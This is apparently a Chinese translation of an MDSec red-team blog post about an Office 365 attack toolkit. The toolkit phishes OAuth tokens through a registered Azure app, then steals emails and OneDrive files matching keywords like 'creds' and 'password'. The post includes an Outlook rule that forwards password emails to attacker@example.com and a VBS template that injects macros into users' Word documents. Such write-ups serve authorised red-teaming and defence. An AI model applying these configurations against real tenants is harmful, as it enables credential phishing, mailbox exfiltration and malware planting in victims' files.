@@ -1,0 +1,161 @@
+**![office365.jpg](https://image.3001.net/images/20190727/1564180885_5d3b819590e78.jpg!small)**
+
+**在红队参与期间，我们经常会与使用Office
+365的组织进行联系。而当前针对这种环境的工具十分有限，这意味着我们可能需要在参与期间进行开发。为了更好地为这些环境做好准备，我们开发了一个专门针对Office
+365的工具包。**
+
+本文我们将探讨如何在Office 365大量使用的环境中，通过利用这些功能来帮助我们的红队参与。
+
+## 概要
+
+简而言之，我们的工具包允许执行身份验证令牌钓鱼，以提取你可能感兴趣的特定信息。这项技术本身并不新鲜，像Fancy Bear (APT28)
+这样的组织，就在[过去针对谷歌的活动](https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks/)中使用过OAuth钓鱼。
+
+当前版本工具包的特性如下：
+
+> 提取与特定关键字匹配的电子邮件
+>
+> 创建恶意Outlook规则
+>
+> 从OneDrive/Sharepoint中提取文件
+>
+> 对存储的word文档的宏注入
+
+在深入了解如何使用此工具包之前，让我们先简要介绍一下主要组件：
+
+> 钓鱼端点（Phishing Endpoint ）- 此端点负责提供执行令牌钓鱼的HTML文件。
+>
+> 后端服务（Backend Service）- 此服务将使用“盗取”令牌并执行定义的攻击。
+>
+> 管理界面（Management Interface ）- 管理界面可用于检查提取的信息。
+
+建议按照如下方式部署此工具包：
+
+![1.png](https://image.3001.net/images/20190727/1564180900_5d3b81a40a816.png!small)
+
+## 部署
+
+为了突出本文的重点，我们将不会详细介绍有关如何编译，基础架构如何设置等问题。我们假设已安装了所有依赖，并已设置HTTPS
+redirector；我们将只关注与工具包相关的配置。
+
+首先，我们需要更新配置以符合我们的需求。你可在template.conf进行配置。
+
+示例配置如下：
+
+    
+    
+    [server]
+     host = 127.0.0.1 ; The IP address for the external listener.
+     externalport = 30662 ; Port for the external listener
+     certificate = server.crt ; Certificate for the external listener
+     key = server.key ; Key for the external listener
+     internalport = 8080 ; Port for the internal listener.
+     ; Keywords used for extracting emails and files of a user.
+     [keywords]
+     outlook = pass,vpn,creds,credentials,new
+     onedrive = password,.config,.xml,db,database,mbd 
+     [backdoor]
+     enabled = true ; Enable/Disable this feature
+     macro = "C:\Test.bas" ; The location of the macro file to use for backdooring documents
+
+根据需要配置你的工具包后，需要在Azure门户上创建一个应用。转到Azure Active Directory -> App Registrations
+-> Register an application：
+
+![2.png](https://image.3001.net/images/20190727/1564180922_5d3b81bab97d8.png!small)
+
+注册应用后，你需要复制应用ID并使用你的应用程序ID更改static/index.html。
+
+此外，应将连接到钓鱼端点的HTTPS redirector URL作为此Azure应用上的重定向URL添加。
+
+要添加重定向URL，请导航到该应用程序，然后单击添加重定向URL即可。
+
+![3.png](https://image.3001.net/images/20190727/1564180938_5d3b81ca70158.png!small)
+
+例如，这里我的URL为：<https://myphishingurl.com/>
+
+![4.png](https://image.3001.net/images/20190727/1564180958_5d3b81de23af8.png!small)
+
+由于钓鱼端点是单页面应用程序，因此你需要在高级设置（Advanced settings）上启用隐式授权流程（ implicit grant flow）。
+
+![5.png](https://image.3001.net/images/20190727/1564180973_5d3b81ed7be5f.png!small)
+
+网络钓鱼登录页用于演示目的，你也可以在static/index.html上更改你的登录页面外观。
+
+## 特性
+
+以下是工具包初始版本中当前实现的所有功能的简要说明。
+
+### 基于关键字的 Outlook Email 提取
+
+此工具包可以使用关键字提取用户的电子邮件。对于配置文件中定义的每个关键字，将下载所有与之匹配的电子邮件并将其存储在数据库中。这些电子邮件可以由之后由操作人员检查。
+
+### Outlook 规则创建
+
+Microsoft Graph API支持创建Outlook规则。你可以通过将规则JSON文件放置在rules/文件夹中来定义不同的规则。
+
+有关如何创建规则的更多信息，请[参阅MSDN文档](?view=graph-rest-1.0&tabs=cs)。
+
+出于演示目的，以下是一个规则的示例。在加载时，会将主体包含“password”关键字的每封电子邮件转发到attacker@example.com：
+
+    
+    
+    {      
+         "displayName": "Example Rule",      
+         "sequence": 2,      
+         "isEnabled": true,          
+         "conditions": {
+             "bodyContains": [
+               "password"       
+             ]
+          },
+          "actions": {
+             "forwardTo": [
+               {
+                  "emailAddress": {
+                     "name": "Attacker Email",
+                     "address": "attacker@example.com"
+                   }
+                }
+             ],
+             "stopProcessingRules": false
+          }    
+     }
+
+### 基于关键字的 OneDrive/Sharepoint 文件提取
+
+Microsoft Graph API可用于访问OneDrive，OneDrive for
+Business和SharePoint文档库中的文件。此工具包可以使用关键字提取用户文件。对于配置文件中的每个已定义关键字，将下载并保存与其匹配的所有文档。然后，操作人员可以使用管理界面检查文档。
+
+### Word 文档宏感染
+
+在OneDrive上托管的用户文档可以通过注入宏来后门。如果启用此功能，用户访问的最后15个文档将被下载，并使用配置文件中定义的宏进行后门操作。上传后门文件后，文档的扩展名将被更改为.doc，以在Word上支持宏。应该注意的是，在对文档进行后门操作之后，它们不能在线编辑，这增加了我们执行payload的机会。
+
+此功能只能在Windows上使用，因为宏的插入是使用Word
+COM对象完成的。VBS文件由下面的模板构建并执行，因此如果你看到wscript.exe正在运行，请不要慌张。
+
+    
+    
+    Dim wdApp
+     Set wdApp = CreateObject("Word.Application")
+     wdApp.Documents.Open("{DOCUMENT}")
+     wdApp.Documents(1).VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "{MACRO}"
+     wdApp.Documents(1).SaveAs2 "{OUTPUT}", 0
+
+## Demo
+
+让我们来看一个简单的演示：
+
+## 安全考虑
+
+除了工具所具有的功能外，它还会在运行的主机上打开一些攻击面。首先，宏感染功能将打开word文件，如果你运行的是未修补的Office版本，可能会增加你的安全风险。此外，提取文件有可能下载到一些恶意文件，这些文件将被保存在你的电脑上。
+
+OpSec方法可能包括正确隔离你的基础架构，并且只允许与HTTPS redirector和Microsoft Graph API进行通信。
+
+这篇文章由[Rio Sherri](https://twitter.com/0x09al)撰写，工具包可以从[MDSec Activebreach
+Github进行下载](https://github.com/mdsecactivebreach/o365-attack-toolkit)。
+
+ **注：**
+在完成这项研究后，我们发现FireEye创建的现有工具包（[PwnAuth](https://www.fireeye.com/blog/threat-research/2018/05/shining-a-light-on-oauth-abuse-with-pwnauth.html)）也采用了类似的方法，因此也应得到大家的认可。
+
+ ***参考来源：[mdsec](https://www.mdsec.co.uk/2019/07/introducing-the-office-365-attack-toolkit/)，FB小编secist编译，转载请注明来自FreeBuf.COM**
+
